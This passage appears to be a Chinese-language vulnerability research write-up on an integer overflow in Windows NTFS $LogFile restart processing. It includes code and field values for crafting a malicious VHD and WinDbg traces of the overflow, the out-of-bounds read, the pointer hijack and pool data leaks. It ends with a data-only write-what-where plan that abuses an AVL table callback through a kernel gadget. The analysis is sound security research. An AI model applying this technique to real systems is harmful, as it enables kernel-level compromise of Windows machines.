```

  
和
```
LastFlushedLsn
```

  
在函数开始时初始化，其值来自
```
Lfcb->LastFlushedLsn
```

  
。
```
Lfcb->LastFlushedLsn
```

  
在函数
```
ntfs!LfsUpdateLfcbFromRestart
```

  
中初始化，其值来自
```
LFS_RESTART_AREA
```

  
结构体的
```
CurrentLsn
```

  
字段。在
```
ntfs!LfsFindLastLsn
```

  
的执行过程中，只有
```
LastKnownLsn
```

  
会发生变化，而
```
LastFlushedLsn
```

  
保持不变。  
  
使 
```
LastKnownLsn
```

  
和 
```
LastFlushedLsn
```

  
不相等的最简单方法是跟踪 
```
ntfs!LfsFindLastLsn
```

  
的执行流程，分析哪些代码被执行，哪些代码未被执行。在默认情况下，
```
LastKnownLsn
```

  
的值来自 **FirstTailPage**  
的 
```
LFS_RECORD_PAGE_HEADER->Packed.LastKnownLsn
```

  
字段。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibHziciabSUKMvuYMKJCa2V6zLxePBZkQMODXgD4MHxIUlicKvSiaIoxNBNw/640?wx_fmt=png&from=appmsg "")  
  
为了确定该字段在 **VHD**  
中的偏移量，我们先简要讨论 
```
ntfs!LfsFindLastLsn
```

  
如何读取尾页（tail pages）。它调用了 
```
ntfs!LfsPinOrMapData
```

  
，其定义如下：  

```
__int64 __fastcall LfsPinOrMapData(LFCB *Lfcb, __int64 FileOffset, __int32 Length, __int8 PinData, __int64 a5, __int8 AllowErrors, __int8 *UsaError, __int64 Buffer, __int64 Bcb, __int32 *pStatus)
```

  
第二个参数是 **FileOffset**  
，但它不是从磁盘或文件系统起始位置计算的偏移量，而是从
```
LFS_RESTART_PAGE
```

  
起始位置计算的。我们可以在**VHD**  
中查找魔数
```
52 53 54 52
```

  
并从中计算尾页（tail pages），或者正确解析**NTFS**  
的**BPB**  
（BIOS Parameter Block）以获取**LogFile**  
的偏移量。我们只需要修改**FirstTailPage**  
的
```
LFS_RECORD_PAGE_HEADER->Packed.LastKnownLsn
```

  
，并注意只要页面正确，
```
ntfs!LfsFindLastLsn
```

  
最终会用**SecondTailPage**  
的内容替换**LastLogPage**  
的内容。这意味着我们需要修复**SecondTailPage**  
的内容。  
  
现在 
```
ntfs!InitializeRestartState
```

  
不会擦除我们的数据，因为 
```
ntfs!LfsCaptureClientRestartArea
```

  
不会被调用，
```
Lfcb->CachedRestartArea
```

  
也不会被初始化，这将强制 
```
ntfs!LfsReadRestartArea
```

  
每次读取数据，而 
```
bCached
```

  
保持初始化为零。  
  
在开始构造 
```
RESTART_AREA
```

  
以触发漏洞函数之前，我们需要先定位目标 
```
RESTART_AREA
```

  
。这里我想简单介绍一下 LSN（Log Sequence Number，日志序列号）。LSN 是 
```
$LogFile
```

  
中的索引，由 
```
SequenceNumber
```

  
、
```
Log Page Number
```

  
和 
```
Log Page Offset
```

  
组成。日志页从 
```
$LogFile
```

  
或 
```
LFS_RESTART_PAGE
```

  
的起始位置开始计算。  
  
以下是 LSN 与偏移量相互转换的函数：  

```
std::tuple<uint64_t, uint64_t> lsn_to_offset(uint64_t lsn, PLFS_RESTART_AREA restart_area) {
  auto absolute_offset = ((lsn << restart_area->SeqNumberBits) & 0xFFFFFFFFFFFFFFFF) >> (restart_area->SeqNumberBits - 3);
  auto log_page_number = absolute_offset / kLogPageSize;
  auto offset_in_page = absolute_offset % kLogPageSize;


  return {log_page_number, offset_in_page};
}


uint64_t lsn_to_seqnum(uint64_t lsn, PLFS_RESTART_AREA restart_area) {
  return lsn >> (64 - restart_area->SeqNumberBits);
}


uint64_t offset_to_lsn(uint64_t page_number, uint64_t page_offset, uint64_t sequence_number, PLFS_RESTART_AREA restart_area) {
  auto absolute_offset = page_number * kLogPageSize + page_offset;
  return (absolute_offset >> 3) | (sequence_number << (64 - restart_area->SeqNumberBits));
};
```

  
让我们将所有内容整合起来，列举出触发整数溢出所需的修改：  
- 修复 
```
LastKnownLsn
```

  
以防止调用 
```
ntfs!LfsCaptureClientRestartArea
```

  
  
- 修复 
```
LFS_CLIENT_RECORD->OldestLsn
```

  
以满足 
```
ntfs!LfsReadLogRecord
```

  
中的检查，该检查要求 
```
TableLsn
```

  
小于 
```
OldestLsn
```

  
。此修复允许我们访问 
```
LastLogPage
```

  
以下的任何日志页  
  
- 使用所需值初始化 
```
RESTART_AREA->OpenAttributeTableLength
```

  
和 
```
RESTART_AREA->OpenAttributeTableLsn
```

  
  
- 在 
```
RESTART_AREA->OpenAttributeTableLsn
```

  
指向的偏移处初始化 
```
LFS_RECORD_HEADER
```

  
  
- 将 
```
LFS_RECORD_HEADER->ClientDataLength
```

  
设置为 
```
ffffffffh
```

  
  
如果我们完成所有这些修复并正确构造 
```
LFS_RECORD_HEADER
```

  
，就能到达漏洞代码。下面是从 **WinDBG**  
中截取的展示整数溢出的跟踪片段。  

```
1: kd> p
rax=fffffa07e5d6ab78 rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=0000000000000001 rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c549b rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=ffffc60b736450e0  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!LfsFindLogRecord+0x63:
fffff801`1e9c549b 448b4118        mov     r8d,dword ptr [rcx+18h] ds:002b:ffff908c`fdcdc218=ffffffff ; Here NTFS.sys loads ClientDataLength field into r8d
1: kd> p
rax=fffffa07e5d6ab78 rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=0000000000000001 rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c549f rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=00000000ffffffff  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!LfsFindLogRecord+0x67:
fffff801`1e9c549f 0fb75760        movzx   edx,word ptr [rdi+60h] ds:002b:ffffc60b`7873cdc0=0030 ; Here NTFS.sys loads RecordHeaderLength field into edx
1: kd> p
rax=fffffa07e5d6ab78 rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=0000000000000030 rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c54a3 rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=00000000ffffffff  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!LfsFindLogRecord+0x6b:
fffff801`1e9c54a3 4103d0          add     edx,r8d ; Here NTFS.sys adds RecordHeaderLength and ClientDataLength field and result is stored back into edx
1: kd> p
rax=fffffa07e5d6ab78 rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=000000000000002f rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c54a6 rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=00000000ffffffff  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei pl nz na pe cy
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040203
Ntfs!LfsFindLogRecord+0x6e:
fffff801`1e9c54a6 8bc2            mov     eax,edx ; Here you can see result of add operation in edx its equal to 2fh
1: kd> p
rax=000000000000002f rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=000000000000002f rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c54a8 rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=00000000ffffffff  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei pl nz na pe cy
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040203
Ntfs!LfsFindLogRecord+0x70:
fffff801`1e9c54a8 483b8770010000  cmp     rax,qword ptr [rdi+170h] ds:002b:ffffc60b`7873ced0=00000000001f4100 ; Here NTFS.sys compares TotalAvailable and eax
1: kd> p
rax=000000000000002f rbx=0000000000183840 rcx=ffff908cfdcdc200
rdx=000000000000002f rsi=fffffa07e5d6ab70 rdi=ffffc60b7873cd60
rip=fffff8011e9c54af rsp=fffffa07e5d6a930 rbp=fffffa07e5d6b8e0
 r8=00000000ffffffff  r9=0000000000000000 r10=0000000000000000
r11=0000000000000002 r12=ffff8002d04d9eb8 r13=ffff8002d0fbe4f0
r14=fffffa07e5d6ab78 r15=fffffa07e5d6aba8
iopl=0         nv up ei ng nz na pe cy
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040283
Ntfs!LfsFindLogRecord+0x77:
fffff801`1e9c54af 7d47            jge     Ntfs!LfsFindLogRecord+0xc0 (fffff801`1e9c54f8) [br=0] ; Comparasion is sucessfully satisfied. Branch is not taken.
```

  
最后一步是绕过 
```
ntfs!NtfsCheckLogRecord
```

  
和 
```
ntfs!NtfsCheckRestartTable
```

  
函数的检查。由于这主要涉及构造满足这两个函数检查的结构，我不会详细描述每个细节。以下是我填充的字段内容。  

```
  ...
  lpNtfsLogRecordHeader->RedoOperation = 0x06;
  lpNtfsLogRecordHeader->UndoOperation = 0x02;
  lpNtfsLogRecordHeader->RedoOffset = 0x100;
  lpNtfsLogRecordHeader->RedoLength = 0x100;
  lpNtfsLogRecordHeader->UndoOffset = 0x200;
  lpNtfsLogRecordHeader->UndoLength = 0x100;
  lpNtfsLogRecordHeader->TargetAttribute = 0xb8;
  lpNtfsLogRecordHeader->LcnsToFollow = 0x4242;
  lpNtfsLogRecordHeader->RecordOffset = 0x50;
  lpNtfsLogRecordHeader->AttributeOffset = 0x0;
  lpNtfsLogRecordHeader->ClusterBlockOffset = 0x0;
  lpNtfsLogRecordHeader->Reserved = 0;
  lpNtfsLogRecordHeader->TargetVcn = 0;
  lpNtfsLogRecordHeader->LcnsForPage[0] = 0;
  ...
  lpRestartTable->EntrySize = 0x4343;
  lpRestartTable->NumberEntries = 0x01;
  lpRestartTable->NumberAllocated = 0x01;
  lpRestartTable->Flags = 0x00;
  lpRestartTable->Reserved = 0x42424242;
  lpRestartTable->FreeGoal = 0x42424242;
  lpRestartTable->FirstFree = 0x0;
  lpRestartTable->LastFree = 0x0;
```

  
当我们正确构造 
```
RESTART_TABLE
```

  
结构后，
```
ntfs!ReadRestartTable
```

  
函数应能成功执行，并到达以下代码：  

```
1: kd> p
rax=0000000000000001 rbx=0000000000000000 rcx=0000000000000210
rdx=00000000fffdedcf rsi=ffff8002cbf1b668 rdi=00000000fffdedcf
rip=fffff8011ea23be3 rsp=fffffa07e414eac0 rbp=fffffa07e414f8e0
 r8=000000005246744e  r9=0000000000000001 r10=fffff80119ca9cc0
r11=fffffa07e414ea50 r12=fffffa07e414ed50 r13=ffff8002d0ddf4f0
r14=0000000000000001 r15=ffff8002d0ddf1b0
iopl=0         nv up ei pl nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202
Ntfs!InitializeRestartState+0xb17:
fffff801`1ea23be3 e8d86028fb      call    nt!ExAllocatePoolWithTag (fffff801`19ca9cc0)
```

  
为了成功分配足够的虚拟内存（**rdx=fffdedcfh**  
），目标虚拟机必须拥有足够的虚拟内存，否则漏洞将无法被触发。  
  
在 
```
nt!ExAllocatePoolWithTag
```

  
成功分配请求的内存后，我们将到达目标 
```
memmove
```

  
函数。  

```
1: kd> p
rax=0000000000000000 rbx=ffffd48000000000 rcx=ffffd48000000000
rdx=ffff92079effd460 rsi=ffffd48f02609018 rdi=00000000fffdedcf
rip=fffff800544d3c1e rsp=fffffe879829fac0 rbp=fffffe87982a08e0
 r8=00000000fffdedcf  r9=0000000000000062 r10=00000000ffffffff
r11=0000000000030c90 r12=fffffe879829fd50 r13=ffffd48f027ed4f0
r14=0000000000000001 r15=ffffd48f027ed1b0
iopl=0         nv up ei pl zr na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
Ntfs!InitializeRestartState+0xb52:
fffff800`544d3c1e e8dd59e8ff      call    Ntfs!memcpy (fffff800`54359600)
```

  
**RDX**  
寄存器保存了数据源地址，该地址实际上是 CacheManager 映射的 **LogFile**  
内存区域。可以看到该区域没有足够的内存，因此应该会发生越界读取 (OOB read)。  

```
Usage:                  System Cache
Base Address:           ffff9207`9efc0000
End Address:            ffff9207`9f000000
Region Size:            00000000`00040000
VA Type:                SystemRange
VACB:                   ffffd48efca69f20 [\$LogFile]
```

  
继续执行后程序发生了崩溃。从下面的 **WinDBG**  
输出中可以看到，崩溃发生的位置与预期不同。  

```
EXCEPTION_RECORD:  ffff8788b4074548 -- (.exr 0xffff8788b4074548)
ExceptionAddress: fffff80121078075 (Ntfs!NtfsCloseAttributesFromRestart+0x000000000000012d)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000000
   Parameter[1]: 0000000000000017
Attempt to read from address 0000000000000017


CONTEXT:  ffff8788b4073d60 -- (.cxr 0xffff8788b4073d60)
rax=ffff9c0100200018 rbx=fffff80120f57d7c rcx=ffff9c0f44a4c4f0
rdx=ffff9c0100200018 rsi=ffff9c0f44a4c1b4 rdi=0000000000000000
rip=fffff80121078075 rsp=ffff8788b4074780 rbp=ffff8788b4075ff0
 r8=ffffffffffffffff  r9=000000000000435b r10=0000000000200000
r11=ffff9c0100200018 r12=ffff9c0f43caa828 r13=ffff9c0f44a4c4f0
r14=ffff8788b4075070 r15=ffff9c0f44a4c1b0
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050286
Ntfs!NtfsCloseAttributesFromRestart+0x12d:
fffff801`21078075 4d8b4818        mov     r9,qword ptr [r8+18h] ds:002b:00000000`00000017=????????????????
```

  
调用栈层级较深，涉及多个异常处理流程。  

```
0: kd> k
 # Child-SP          RetAddr               Call Site
00 ffff8788`b4072cc8 fffff801`1b766572     nt!DbgBreakPointWithStatus
01 ffff8788`b4072cd0 fffff801`1b765c33     nt!KiBugCheckDebugBreak+0x12
02 ffff8788`b4072d30 fffff801`1b6149b7     nt!KeBugCheck2+0xba3
03 ffff8788`b40734a0 fffff801`1b6354b4     nt!KeBugCheckEx+0x107
04 ffff8788`b40734e0 fffff801`1b5d1631     nt!PspSystemThreadStartup$filt$0+0x44
05 ffff8788`b4073520 fffff801`1b61ff4f     nt!_C_specific_handler+0xa1
06 ffff8788`b4073590 fffff801`1b47b593     nt!RtlpExecuteHandlerForException+0xf
07 ffff8788`b40735c0 fffff801`1b513c3e     nt!RtlDispatchException+0x2f3
08 ffff8788`b4073d30 fffff801`1b62a97c     nt!KiDispatchException+0x1ae
09 ffff8788`b4074410 fffff801`1b625c63     nt!KiExceptionDispatch+0x13c
0a ffff8788`b40745f0 fffff801`21078075     nt!KiPageFault+0x463
0b ffff8788`b4074780 fffff801`21095f12     Ntfs!NtfsCloseAttributesFromRestart+0x12d
0c ffff8788`b4074830 fffff801`1b5d1721     Ntfs!NtfsMountVolume$fin$14+0xe3
0d ffff8788`b40749d0 fffff801`20ef935e     nt!_C_specific_handler+0x191
0e ffff8788`b4074a40 fffff801`1b61ffcf     Ntfs!_GSHandlerCheck_SEH+0x6a
0f ffff8788`b4074a70 fffff801`1b47c4f8     nt!RtlpExecuteHandlerForUnwind+0xf
10 ffff8788`b4074aa0 fffff801`1b5d167b     nt!RtlUnwindEx+0x2d8
11 ffff8788`b40751d0 fffff801`20ef935e     nt!_C_specific_handler+0xeb
12 ffff8788`b4075240 fffff801`1b61ff4f     Ntfs!_GSHandlerCheck_SEH+0x6a
13 ffff8788`b4075270 fffff801`1b47b593     nt!RtlpExecuteHandlerForException+0xf
14 ffff8788`b40752a0 fffff801`1b4feecf     nt!RtlDispatchException+0x2f3
15 ffff8788`b4075a10 fffff801`20ec28f9     nt!RtlRaiseStatus+0x4f
16 ffff8788`b4075fb0 fffff801`21033d64     Ntfs!NtfsRaiseStatusInternal+0x6d
17 ffff8788`b4075ff0 fffff801`20feb74b     Ntfs!NtfsMountVolume+0x5bd4
18 ffff8788`b40767d0 fffff801`20ee75ab     Ntfs!NtfsCommonFileSystemControl+0xd7
19 ffff8788`b40768b0 fffff801`1b4d8c25     Ntfs!NtfsFspDispatch+0x62b
1a ffff8788`b4076a00 fffff801`1b4ded97     nt!ExpWorkerThread+0x155
```

  
从调用栈中我们可以得出以下关键点：  
- 异常发生在异常处理程序 
```
Ntfs!NtfsMountVolume$fin$14
```

  
中  
  
- 异常触发位置为 
```
Ntfs!NtfsMountVolume+0x5bd4
```

  
  
- 异常发生在 
```
Ntfs!NtfsRestartVolume
```

  
完成之后  
  
首先分析异常原因。异常是由于 
```
nt!IoAllocateMdl
```

  
返回 
```
NULL
```

  
导致的。根据文档，这种情况通常发生在内存不足时，状态码 
```
STATUS_INSUFFICIENT_RESOURCES
```

  
也证实了这一点。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibd1DCe0rc2rFfUxH7FMH2oLu6PGKIyhLmLX0zOAdfExbepQLsCENicicw/640?wx_fmt=png&from=appmsg "")  
  
接下来分析 
```
Ntfs!NtfsCloseAttributesFromRestart
```

  
中的内存破坏问题。具体问题发生在图中红色标注的位置。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibDAPyPon2OxGOkSlA9FOlTiaENxpgF3EaaeXoNEra0IRqKmrtl7QQX4w/640?wx_fmt=png&from=appmsg "")  
  
变量 v8（实际上是 **FirstRestartTable**  
结构）的值来自 
```
ntfs!NtfsGetFirstRestartTable
```

  
，该函数返回一个指向之前步骤中分配的大缓冲区的指针，具体位置在 
```
Ntfs!InitializeRestartState+0xb17
```

  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibO371VUPXCwmHdIp3rFwLas1eu29ZdLicVNZLXKG6KynlIqjYWQbAdIg/640?wx_fmt=png&from=appmsg "")  
  

```
Table
```

  
指针的值在 
```
Ntfs!InitializeRestartState
```

  
中初始化。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibIlicHLyqGq7COia4jJNwcertBqjEuE14mnKpx68kLIxKsNRpThMgkltQ/640?wx_fmt=png&from=appmsg "")  
  
这意味着我们可以通过控制 
```
ntfs!NtfsGetFirstRestartTable
```

  
的代码来创建特定条目，从而控制解引用的指针值，实现可控的指针解引用。  

```
EXCEPTION_RECORD:  ffff8405913e0548 -- (.exr 0xffff8405913e0548)
ExceptionAddress: fffff80553d98075 (Ntfs!NtfsCloseAttributesFromRestart+0x000000000000012d)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000000
   Parameter[1]: ffffffffffffffff
Attempt to read from address ffffffffffffffff


CONTEXT:  ffff8405913dfd60 -- (.cxr 0xffff8405913dfd60)
rax=ffffc0888ec00018 rbx=fffff80553c77d7c rcx=ffffc0888e8364f0
rdx=ffffc0888ec00018 rsi=ffffc0888e8361b4 rdi=0000000000000000
rip=fffff80553d98075 rsp=ffff8405913e0780 rbp=ffff8405913e1ff0
 r8=4141414141414141  r9=000000000000435b r10=000000008ec00000
r11=ffffc0888ec00018 r12=ffffc0888a6aad38 r13=ffffc0888e8364f0
r14=ffff8405913e1070 r15=ffffc0888e8361b0
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00050286
Ntfs!NtfsCloseAttributesFromRestart+0x12d:
fffff805`53d98075 4d8b4818        mov     r9,qword ptr [r8+18h] ds:002b:41414141`41414159=????????????????
Resetting default scope
```

  
当然，在越界读取过程中复制的所有数据都会保留在内存池中，这使得获取一些有用的内存泄露信息成为可能。  

```
ffffba84`4c200018  ff ff ff ff 42 42 42 42-42 42 42 42 42 42 42 42  ....BBBBBBBBBBBB
ffffba84`4c200028  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
ffffba84`4c200038  41 41 41 41 41 41 41 41-ff ff ff ff ff ff ff ff  AAAAAAAA........
...
fffba84`4c202ba8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ - - -
ffffba84`4c202bb8  00 00 00 00 00 00 00 00-34 00 38 00 39 00 30 00  ........4.8.9.0.      |
ffffba84`4c202bc8  45 00 46 00 46 00 34 00-31 00 33 00 34 00 38 00  E.F.F.4.1.3.4.8.      |
ffffba84`4c202bd8  41 00 32 00 44 00 33 00-46 00 41 00 31 00 30 00  A.2.D.3.F.A.1.0.      |
ffffba84`4c202be8  34 00 41 00 38 00 35 00-43 00 38 00 30 00 37 00  4.A.8.5.C.8.0.7.      |
ffffba84`4c202bf8  35 00 45 00 32 00 30 00-45 00 30 00 32 00 35 00  5.E.2.0.E.0.2.5.      |
ffffba84`4c202c08  46 00 37 00 43 00 46 00-34 00 30 00 44 00 30 00  F.7.C.F.4.0.D.0.       -  Leaked Data
ffffba84`4c202c18  30 00 34 00 45 00 32 00-42 00 43 00 31 00 43 00  0.4.E.2.B.C.1.C.      |
ffffba84`4c202c28  33 00 43 00 39 00 41 00-41 00 35 00 34 00 38 00  3.C.9.A.A.5.4.8.      |
ffffba84`4c202c38  36 00 35 00 46 00 34 00-97 81 50 e2 04 94 db 01  6.5.F.4...P.....      |
ffffba84`4c202c48  af 00 3e 3d d3 61 d8 01-9c 00 00 00 00 00 00 00  ..>=.a..........      |
ffffba84`4c202c58  00 00 3a 00 00 00 c6 44-80 de 6b 39 db 01 14 00  ..:....D..k9....      |
ffffba84`4c202c68  00 00 04 00 00 00 01 79-00 00 80 00 57 44 4d 43  .......y....WDMC - - -
```

## 漏洞利用 (Exploitation)  
  
我们可以劫持指向 
```
OpenAttributeTable
```

  
结构的指针。被劫持结构的内存布局如下所示：  

```
00000000 struct OPEN_ATTRIBUTE_DATA // sizeof=0x30
00000000 {
00000000     LIST_ENTRY Links;
00000010     __int32 OnDiskAttributeIndex;
00000014     __int8 AttributeNamePresent;
00000015     // padding byte
00000016     // padding byte
00000017     // padding byte
00000018     __int64 Scb;
00000020     UNICODE_STRING AttributeName;
00000030 };
```

  
该结构包含三个关键字段：  
- **Links**  
：实际类型为 
```
LIST_ENTRY
```

  
。该字段值得注意，因为任何插入或删除操作都会导致内存写入，而我们可以控制指针值。不过，微软的链表安全缓解措施（如安全解除链接）增强了其安全性。  
  
- **AttributeName**  
：一个 
```
UNICODE_STRING
```

  
字段。该字段存在多种潜在的滥用方式（例如 
```
memset
```

  
、
```
memcpy
```

  
、
```
free
```

  
等）。  
  
- **Scb**  
：实际类型为 SCB（Stream Control Block，流控制块），它指向 FCB（File Control Block，文件控制块）、
```
FILE_OBJECT
```

  
甚至 VCB（Volume Control Block，卷控制块）等结构。  
  
这个被劫持的结构看起来相当有潜力。现在让我们检查使用它的代码。  
  
乍看之下，
```
ntfs!NtfsCloseAttributesFromRestart
```

  
似乎没有对被劫持的字段执行任何有用的读取或写入操作。  
  
尽管如此，我们确实获得了释放任意指针的能力。虽然这为某些 Windows 子系统或对象中的潜在释放后使用（Use-After-Free, UAF）条件打开了大门，但尚不清楚在此上下文中我们具体可以释放什么，总体来看，利用路径似乎不太可靠。那么，是否有更好的选择？  

```
    if ( v12->AttributeNamePresent )
    {
      NtfsFreeScbAttributeName(v12->AttributeName.Buffer);
      v11->OatData->AttributeName.Buffer = 0LL;
    }
```

  
是的，继续查看反编译函数，你会发现这个关键点。  

```
//ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
    if ( (Fcb->FcbState & 0x40) != 0 ) {
        v37 = 0LL;
        Buffer = v14;
        RtlDeleteElementGenericTableAvl(&Fcb->Vcb->FcbTable, &Buffer); // <--- our little princess
        lpScb->Fcb->FcbState &= ~0x40u;
    NtfsDereferenceMftView((__int64)lpScb->Fcb->Vcb, &v33, 1);
    }
```

  
如果你熟悉 Windows 内核如何实现映射表 (map)，可能已经会心一笑。如果不熟悉，让我为你介绍 AVL 树 (Adelson-Velsky and Landis Tree)。其实现基于自平衡 AVL 树。这些树通过基于回调的扩展机制设计为通用结构，关键回调函数包括：  
- 
```
CompareRoutine
```

  
（比较例程）  
  
- 
```
AllocateRoutine
```

  
（分配例程）  
  
- 
```
FreeRoutine
```

  
（释放例程）  
  
幸运的是，
```
_RTL_AVL_TABLE
```

  
结构布局可通过公共符号获取，且 
```
nt!RtlDeleteElementGenericTableAvl
```

  
的反编译代码相当直观。  

```
  if ( !Table->NumberGenericTableElements )
    return 0;
  RightChild = Table->BalancedRoot.RightChild;
  while ( 1 )
  {
    v5 = Table->CompareRoutine(Table, Buffer, &RightChild[1]);
    if ( v5 == GenericLessThan )
    {
      RightChild = RightChild->LeftChild;
      goto LABEL_7;
    }
    if ( v5 != GenericGreaterThan )
      break;
    RightChild = RightChild->RightChild;
LABEL_7:
    if ( !RightChild )
      return 0;
  }
  if ( RightChild == Table->RestartKey )
    Table->RestartKey = (_RTL_BALANCED_LINKS *)RealPredecessor(RightChild);
  ++Table->DeleteCount;
  DeleteNodeFromTree(Table, RightChild);
  --Table->NumberGenericTableElements;
  Table->WhichOrderedElement = 0;
  Table->OrderedPointer = 0LL;
  Table->FreeRoutine(Table, RightChild);
```

  
以下是 
```
_RTL_AVL_TABLE
```

  
和 
```
_RTL_BALANCED_LINKS
```

  
的内存布局：  

```
00000000 struct _RTL_AVL_TABLE // sizeof=0x68
00000000 {
00000000     _RTL_BALANCED_LINKS BalancedRoot;
00000020     void *OrderedPointer;
00000028     unsigned int WhichOrderedElement;
0000002C     unsigned int NumberGenericTableElements;
00000030     unsigned int DepthOfTree;
00000034     // padding byte
00000035     // padding byte
00000036     // padding byte
00000037     // padding byte
00000038     _RTL_BALANCED_LINKS *RestartKey;
00000040     unsigned int DeleteCount;
00000044     // padding byte
00000045     // padding byte
00000046     // padding byte
00000047     // padding byte
00000048     _RTL_GENERIC_COMPARE_RESULTS (__fastcall *CompareRoutine)(_RTL_AVL_TABLE *, void *, void *);
00000050     void *(__fastcall *AllocateRoutine)(_RTL_AVL_TABLE *, unsigned int);
00000058     void (__fastcall *FreeRoutine)(_RTL_AVL_TABLE *, void *);
00000060     void *TableContext;
00000068 };


00000000 struct __declspec(align(8)) _RTL_BALANCED_LINKS // sizeof=0x20
00000000 {
00000000     _RTL_BALANCED_LINKS *Parent;
00000008     _RTL_BALANCED_LINKS *LeftChild;
00000010     _RTL_BALANCED_LINKS *RightChild;
00000018     char Balance;
00000019     unsigned __int8 Reserved[3];
0000001C     // padding byte
0000001D     // padding byte
0000001E     // padding byte
0000001F     // padding byte
00000020 };
```

  
从反编译逻辑中，我们发现一个绝佳的机会可以通过 
```
CompareRoutine
```

  
或 
```
FreeRoutine
```

  
进行**控制流劫持**  
。但需要注意的是，两者都受到 kCFG（Kernel Control Flow Guard，内核控制流防护）的保护，因此无法直接进行任意 ROP 攻击。  
  
这让我们面临两个选择：  
- 我们可以使用某种技术绕过 kCFG 和/或 HVCI（Hypervisor-Protected Code Integrity，虚拟机管理程序保护的代码完整性）来实现内核代码执行。例如，我们可以使用 slowerzs 在博客文章中发布的关于代码重用的精妙技术来绕过 kCFG 和 HVCI，甚至实现任意 ROP/JOP 攻击。  
  
- 或者我们可以重用 Windows 内核代码来获得任意写（write-what-where）能力，并构建一个仅使用数据的漏洞利用程序  
  
出于研究目的，我们选择第二条路径。  
  
根据 
```
nt!RtlDeleteElementGenericTableAvl
```

  
的控制流，第一个可控的间接调用是 
```
CompareRoutine
```

  
，它接受三个参数。我们控制参数 1 和参数 3 的指针和内容。第二个参数是一个栈指针，我们只能控制它指向的值。  
  
在快速浏览 
```
ntoskrnl
```

  
后，我找到了一个合适的 gadget：
```
nt!RtlpFcBufferManagerReferenceBuffers
```

  
。这个函数完美契合我们的控制能力：  

```
__int64 __fastcall RtlpFcBufferManagerReferenceBuffers(__int64 TablePtr, __int64 Buffer, __int64 RightChild_1) {


  RtlpFcEnterRegion();
  v5 = (unsigned int)RtlAcquireSwapReference((__int64 *)TablePtr);
  result = *(_QWORD *)(TablePtr + 8 * v5 + 168);
  *v7 = result;
  *(_QWORD *)RightChild_1 = TablePtr + 8 * (v5 + 8 * v5 + 3);
  return result;
}
```

  
我们将使用该函数实现内核的**任意地址写（write-what-where）**  
。下图展示了其工作原理：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCM8OiaFFdRfrz0MY2VojWkkibY3uZPwVIoMrltLlywznDCzoLI034jGVTYCrGCV4wwFYichskasr4Vmw/640?wx_fmt=png&from=appmsg "")  
  
